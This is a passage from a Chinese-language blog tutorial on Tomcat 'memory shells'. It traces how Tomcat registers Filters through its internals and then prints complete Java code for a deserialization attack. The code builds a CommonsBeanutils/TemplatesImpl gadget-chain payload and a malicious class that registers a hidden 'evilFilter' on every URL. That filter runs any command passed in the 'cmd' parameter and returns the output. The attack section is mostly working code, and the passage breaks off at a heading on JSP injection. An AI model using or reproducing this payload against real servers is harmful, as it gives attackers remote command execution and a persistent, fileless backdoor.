href="https://pic.imgdb.cn/item/64d26dec1ddac507cc052963.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26dec1ddac507cc052963.jpg"></a></p><p>进入后，发现<code>org.apache.catalina.startup.ContextConfig#processAnnotationWebFilter</code>是处理@WebFilter的函数：</p><p><a href="https://pic.imgdb.cn/item/64d26dfa1ddac507cc054e8a.jpg" title="image-20230803140753347" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26dfa1ddac507cc054e8a.jpg" alt="image-20230803140753347"></a></p><p>打下断点，跟进：</p><p><a href="https://pic.imgdb.cn/item/64d26e051ddac507cc056871.jpg" title="image-20230803141110427" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e051ddac507cc056871.jpg" alt="image-20230803141110427"></a></p><p>可以看到，filterName的值为我们在注解中配置好的filterName。接着往下看：</p><p><a href="https://pic.imgdb.cn/item/64d26e0f1ddac507cc0583ab.jpg" title="image-20230803141315613" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e0f1ddac507cc0583ab.jpg" alt="image-20230803141315613"></a></p><p>创建filterDef对象，设置了filterName和filterClass，其中filterClass是我们创建的FIlter的全限定名。之后遍历evps</p><p><a href="https://pic.imgdb.cn/item/64d26e191ddac507cc059dbc.jpg" title="image-20230803141701994" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e191ddac507cc059dbc.jpg" alt="image-20230803141701994"></a></p><p>for 循环两次，<code>evp.getNameString()</code>获得的字符串结果有两个，一个是filterName，还有一个是urlPatterns，也就是我们在注解中配置那两个参数。当name变量被赋值urlPatterns时，进入if语句：</p><p><a href="https://pic.imgdb.cn/item/64d26e251ddac507cc05bb2a.jpg" title="image-20230803143642794" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e251ddac507cc05bb2a.jpg" alt="image-20230803143642794"></a></p><p>得到urlPatterns并遍历，将所有的urlPattern添加进filterMap中。继续跟进：</p><p><a href="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" title="image-20230803143853818" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" alt="image-20230803143853818"></a></p><p>可以看到，通过调用<code>addFilter()</code>和<code>addFilterMapping()</code>将<code>filterDef</code>和<code>filterMap</code>添加进<code>fragment</code>中。fragment是个webXml对象，里面存放着web的各种配置信息，会和web.xml读取出来的信息会进行合并。继续跟进，执行到如下代码：</p><p><a href="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" title="image-20230803144420033" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" alt="image-20230803144420033"></a></p><p>又是<code>configureContext</code>函数，还记得我们上面在分析注册Servlet流程的时候也看到了这个函数吗？这里注释解释得也很清楚，此处是将合并后的web.xml应用于Context。进入configureContext函数，此处调用addFilterDef()和addFilterMap()方法，context同样是一个StandardContext对象：</p><p><a href="https://pic.imgdb.cn/item/64d26e461ddac507cc061134.jpg" title="image-20230803144837194" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e461ddac507cc061134.jpg" alt="image-20230803144837194"></a></p><p>但是请注意，此时仍然完成自定义 Filter 的注册，因为并没有将这个 Filter 放到 FilterChain 中。之后我们在doFilter处打下断点，访问&#x2F;hello-servlet，看到调用栈：</p><p><a href="https://pic.imgdb.cn/item/64d26e561ddac507cc063bef.jpg" title="image-20230803150533995" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e561ddac507cc063bef.jpg" alt="image-20230803150533995"></a></p><p>发现在下图的位置<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>执行了<code>doFilter</code>：</p><p><a href="https://pic.imgdb.cn/item/64d26e621ddac507cc065b55.jpg" title="image-20230803150726766" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e621ddac507cc065b55.jpg" alt="image-20230803150726766"></a></p><p>可以看到filter是从filterConfig取出的，而filterConfig是从filters数组中的元素赋值得到的。那么ApplicationFilterChain是什么时候被创建的呢？它其中的filters字段又是什么时候被赋值的呢？继续看调用栈：</p><p><a href="https://pic.imgdb.cn/item/64d26e6c1ddac507cc067732.jpg" title="image-20230803151021951" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e6c1ddac507cc067732.jpg" alt="image-20230803151021951"></a></p><p>向上回溯，可以看到下图的位置执行了filterChain.doFilter()，也正是因为这里的调用，我们创建的Filter中的doFilter得以执行：</p><p><a href="https://pic.imgdb.cn/item/64d26e791ddac507cc0697ef.jpg" title="image-20230803151109791" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e791ddac507cc0697ef.jpg" alt="image-20230803151109791"></a></p><p>向上看，可以看到filterChain是通过ApplicationFilterFactory.createFilterChain()得到的。跟进org.apache.catalina.core.ApplicationFilterFactory#createFilterChain，打下断点，进行调试：</p><p><a href="https://pic.imgdb.cn/item/64d26e841ddac507cc06b4fd.jpg" title="image-20230803152059321" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e841ddac507cc06b4fd.jpg" alt="image-20230803152059321"></a></p><p><a href="https://pic.imgdb.cn/item/64d26e8f1ddac507cc06d27b.jpg" title="image-20230803152124788" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e8f1ddac507cc06d27b.jpg" alt="image-20230803152124788"></a></p><p>取出StandardContext中的filterMaps并复制给filterMaps，可以看到filterMaps中有我们创建的Filter：</p><p><a href="https://pic.imgdb.cn/item/64d26e9b1ddac507cc06f156.jpg" title="image-20230803152213935" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26e9b1ddac507cc06f156.jpg" alt="image-20230803152213935"></a></p><p>继续跟进：</p><p><a href="https://pic.imgdb.cn/item/65750a0dc458853aefefc0be.jpg" title="image-20230803152213936" class="gallery-item"><img src="https://pic.imgdb.cn/item/65750a0dc458853aefefc0be.jpg" alt="image-20230803152213936"></a></p><p><a href="https://pic.imgdb.cn/item/64d26eee1ddac507cc07ccd3.jpg" title="image-20230803152442214" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26eee1ddac507cc07ccd3.jpg" alt="image-20230803152442214"></a></p><p>通过.addFilter()方法添加进从StandardContext中取出的filterConfig，并将其赋值给filterChain中的filters数组字段中的元素。至此，我们就已经完整地跟进了整个Filter的注册和doFilter的调用。</p><p>过程其实挺好理解，总结一下：</p><p>1.获取StandardContext：</p><p>2.创建FilterDef，通过addFilterDef()函数添加进StandardContext</p><p>3.创建ApplicationFilterConfig，通过反射拿到StandardContext的filterConfigs字段，并调用put()方法将ApplicationFilterConfig添加进StandardContext</p><p>3.创建FilterMap，通过addFilterMapBefore()函数添加进StandardContext。</p><h4 id="反序列化注入Tomcat-Filter-型内存马"><a href="#反序列化注入Tomcat-Filter-型内存马" class="headerlink" title="反序列化注入Tomcat-Filter 型内存马"></a>反序列化注入Tomcat-Filter 型内存马</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(FilterTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把请求传回过滤链</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> HashSet&lt;Object&gt; h;</span><br><span class="line">    <span class="keyword">static</span> HttpServletRequest r;</span><br><span class="line">    <span class="keyword">static</span> HttpServletResponse p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterTemplatesImpl</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//静态变量直接填null即可</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                AddMemoryShell(lastServicedRequest, lastServicedResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterTemplatesImpl</span><span class="params">(String s)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(ThreadLocal&lt;ServletRequest&gt; lastServicedRequest, ThreadLocal&lt;ServletResponse&gt; lastServicedResponse)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//开始注入内存马</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ApplicationContext 为 ServletContext 的实现类</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 这样我们就获取到了 context</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterTemplatesImpl</span>(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(evilFilter);</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理与反序列化Tomcat-Servlet差不多，只是把恶意模板类改成Filter的实现，创建Servlet的流程改成创建Filter的流程。就不过多解释了。</p><h4 id="jsp注入Tomcat-Filter-型内存马"><a href="#jsp注入Tomcat-Filter-型内存马" class="headerlink" title="jsp注入Tomcat-Filter 型内存马"></a>jsp注入Tomcat-Filter 